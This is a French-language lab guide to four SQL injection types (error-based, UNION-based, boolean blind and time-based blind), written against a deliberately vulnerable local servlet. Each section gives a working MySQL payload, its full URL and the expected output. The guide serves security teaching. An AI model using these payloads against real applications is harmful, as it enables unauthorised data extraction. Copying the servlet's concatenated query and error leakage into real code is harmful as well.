# Guide Pratique : Les 4 Types d'Injections SQL (SQLi)

Ce document explique les 4 types principaux d'injections SQL (SQLi) et comment les tester et les pratiquer en utilisant l'application vulnérable (Victim App) configurée dans ce projet.

---

## 📊 Présentation des 4 Types de SQL Injection

Les injections SQL se divisent principalement en deux grandes catégories : **In-Band** (le attaquant reçoit les données directement dans la réponse) et **Inferential / Blind** (l'application ne montre pas les données directement, l'attaquant doit déduire les informations).

| Type | Catégorie | Description |
| :--- | :--- | :--- |
| **1. Error-Based SQLi** | In-Band | L'attaquant force la base de données à générer une erreur contenant les données sensibles. |
| **2. Union-Based SQLi** | In-Band | L'attaquant fusionne les résultats de la requête originale avec une autre requête via l'opérateur `UNION`. |
| **3. Boolean-Based Blind SQLi** | Inferential | L'attaquant pose des questions Vrai/Faux à la base de données et analyse la différence visuelle de la page. |
| **4. Time-Based Blind SQLi** | Inferential | L'attaquant force la base de données à attendre (sommeil) pendant quelques secondes si sa condition est vraie. |

---

## 🛠️ Pratique des 4 types sur l'application de Lab

Notre servlet exécute la requête suivante :
`SELECT * FROM users WHERE id = [id]`

La base de données contient la table `users` avec 3 enregistrements (`id=1: admin`, `id=2: user`, `id=3: test`).

---

### 1. Error-Based SQLi (Injection basée sur les erreurs)

*   **Concept :** Puisque le code de notre servlet attrape les exceptions de base de données et les affiche à l'écran via `e.getMessage()`, nous pouvons forcer MySQL à lever une erreur contenant les données que nous voulons voler (comme la version de MySQL ou le nom de la base de données).
*   **Payload (Exploit) :**
    `1 AND extractvalue(1, concat(0x7e, (SELECT database())))`
*   **Test dans l'application :**
    Ouvrez ce lien dans votre navigateur :
    [http://localhost:8080/vulnerable?id=1+AND+extractvalue(1%2C+concat(0x7e%2C+(SELECT+database())))&name=Guest&page=home](http://localhost:8080/vulnerable?id=1+AND+extractvalue(1%2C+concat(0x7e%2C+(SELECT+database())))&name=Guest&page=home)
*   **Résultat attendu :** L'application affichera à l'écran :
    `Erreur : XPATH syntax error: '~app'`
    *(La base de données a révélé son nom `app` à l'intérieur du message d'erreur !)*

---

### 2. Union-Based SQLi (Injection basée sur l'opérateur UNION)

*   **Concept :** L'attaquant utilise l'opérateur `UNION` pour ajouter ses propres lignes de résultats. Pour que cela fonctionne, la requête injectée doit retourner le même nombre de colonnes que la requête d'origine (ici la table `users` possède 3 colonnes : `id`, `username`, `password`).
*   **Payload (Exploit) :**
    `-1 UNION SELECT 1, 'fake_user', 'fake_password'`
*   **Test dans l'application :**
    Ouvrez ce lien dans votre navigateur :
    [http://localhost:8080/vulnerable?id=-1+UNION+SELECT+1%2C+'fake_user'%2C+'fake_password'&name=Guest&page=home](http://localhost:8080/vulnerable?id=-1+UNION+SELECT+1%2C+'fake_user'%2C+'fake_password'&name=Guest&page=home)
*   **Résultat attendu :** Bien que l'identifiant `-1` n'existe pas, la partie `UNION` retourne une ligne valide. L'application affiche donc :
    `Bienvenue Guest !` au lieu de `Utilisateur inconnu`.

---

### 3. Boolean-Based Blind SQLi (Injection aveugle basée sur les booléens)

*   **Concept :** Si l'application masquait les erreurs de base de données, nous ne pourrions pas utiliser la méthode 1 (Error-based). Nous devons donc poser des questions de type Vrai/Faux.
    *   Si la question est **Vraie**, la page affiche : `Bienvenue Guest !`
    *   Si la question est **Fausse**, la page affiche : `Utilisateur inconnu`
*   **Payloads (Exploits) :**
    *   **Question Vraie :** `1 AND 1=1`
        [http://localhost:8080/vulnerable?id=1+AND+1%3D1&name=Guest&page=home](http://localhost:8080/vulnerable?id=1+AND+1%3D1&name=Guest&page=home) -> Affiche `Bienvenue Guest !`
    *   **Question Fausse :** `1 AND 1=2`
        [http://localhost:8080/vulnerable?id=1+AND+1%3D2&name=Guest&page=home](http://localhost:8080/vulnerable?id=1+AND+1%3D2&name=Guest&page=home) -> Affiche `Utilisateur inconnu`
*   **Extraction de données (Exemple) :**
    Pour deviner si la première lettre de la base de données est 'a' :
    `1 AND substring(database(),1,1)='a'`
    [http://localhost:8080/vulnerable?id=1+AND+substring(database()%2C1%2C1)%3D'a'&name=Guest&page=home](http://localhost:8080/vulnerable?id=1+AND+substring(database()%2C1%2C1)%3D'a'&name=Guest&page=home)
    *   **Résultat :** Affiche `Bienvenue Guest !` (Ce qui confirme que la première lettre est bien 'a').

---

### 4. Time-Based Blind SQLi (Injection aveugle basée sur le temps)

*   **Concept :** Parfois, l'application renvoie exactement la même page ou le même message, que la requête réussisse ou échoue. Dans ce cas, nous forçons la base de données à suspendre son exécution (faire une pause/sommeil) pendant un certain nombre de secondes si notre condition est vraie.
*   **Payload (Exploit) :**
    `1 AND (SELECT IF(1=1, SLEEP(5), 0))`
*   **Test dans l'application :**
    Ouvrez ce lien dans votre navigateur :
    [http://localhost:8080/vulnerable?id=1+AND+(SELECT+IF(1%3D1%2C+SLEEP(5)%2C+0))&name=Guest&page=home](http://localhost:8080/vulnerable?id=1+AND+(SELECT+IF(1%3D1%2C+SLEEP(5)%2C+0))&name=Guest&page=home)
*   **Résultat attendu :** Le navigateur commencera à charger la page et mettra exactement **5 secondes** à répondre, prouvant que la condition `1=1` a été évaluée comme vraie par MySQL.
